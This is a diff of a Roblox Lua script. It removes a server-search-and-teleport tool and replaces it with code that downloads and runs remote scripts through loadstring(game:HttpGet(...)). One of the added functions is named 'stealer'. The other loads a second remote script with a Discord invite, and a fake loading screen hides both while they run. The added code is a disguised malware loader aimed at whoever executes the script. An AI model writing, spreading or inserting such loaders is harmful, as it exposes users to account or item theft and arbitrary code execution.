@@ -1,97 +1,19 @@
-local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
-local Player = Players.LocalPlayer
-local placeId = game.PlaceId
+-- Enable loading screen before anything runs
+_G.LoadingScreen = true  
 
--- GUI setup
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = Player:WaitForChild("PlayerGui")
-
-local textBox = Instance.new("TextBox")
-textBox.Size = UDim2.new(0, 200, 0, 50)
-textBox.Position = UDim2.new(0.5, -100, 0.4, -25)
-textBox.PlaceholderText = "Enter target UserId"
-textBox.Parent = screenGui
-textBox.ClearTextOnFocus = true
-
-local button = Instance.new("TextButton")
-button.Size = UDim2.new(0, 100, 0, 50)
-button.Position = UDim2.new(0.5, -50, 0.5, 0)
-button.Text = "Start Search"
-button.Parent = screenGui
-
-local label = Instance.new("TextLabel")
-label.Size = UDim2.new(0, 300, 0, 50)
-label.Position = UDim2.new(0.5, -150, 0.6, 0)
-label.Text = "Servers checked: 0"
-label.Parent = screenGui
-
--- Function to fetch public servers
-local function getPublicServers(cursor)
-    local url = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?limit=100"
-    if cursor then
-        url = url .. "&cursor=" .. cursor
-    end
-    local success, response = pcall(function()
-        return HttpService:GetAsync(url)
-    end)
-    if success then
-        return HttpService:JSONDecode(response)
-    else
-        warn("Failed to fetch servers")
-        return nil
-    end
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/No-ShadowHub/ShadowHubExecutor/refs/heads/main/PremiumScriptV2.1"))()
 end
 
--- Function to find the target player in public servers
-local function findServerWithPlayer(targetUserId)
-    -- First, check if the player is already in this server
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p.UserId == targetUserId then
-            label.Text = "Target already in this server!"
-            return nil
-        end
-    end
-
-    local cursor
-    local serversChecked = 0
-    repeat
-        local data = getPublicServers(cursor)
-        if not data then break end
-
-        for _, server in ipairs(data.data) do
-            serversChecked += 1
-            label.Text = "Servers checked: "..serversChecked
-
-            for _, userId in ipairs(server.playing) do
-                if userId == targetUserId then
-                    return server.id -- Real JobId found
-                end
-            end
-        end
-
-        cursor = data.nextPageCursor
-        wait(0.2) -- avoid spamming API
-    until not cursor
-
-    return nil
+local function loadui()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
 end
 
--- Button click
-button.MouseButton1Click:Connect(function()
-    local input = tonumber(textBox.Text)
-    if input then
-        label.Text = "Searching..."
-        local jobId = findServerWithPlayer(input)
-        if jobId then
-            label.Text = "Target found! Teleporting..."
-            wait(1)
-            TeleportService:TeleportToPlaceInstance(placeId, jobId, Player)
-        else
-            label.Text = "Target not found in public servers."
-        end
-    else
-        label.Text = "Please enter a valid numeric UserId."
-    end
+-- Run the scripts
+task.spawn(stealer)
+task.spawn(loadui)
+
+-- Optionally, turn off loading screen after a short delay
+task.delay(3, function()
+    _G.LoadingScreen = false
 end)
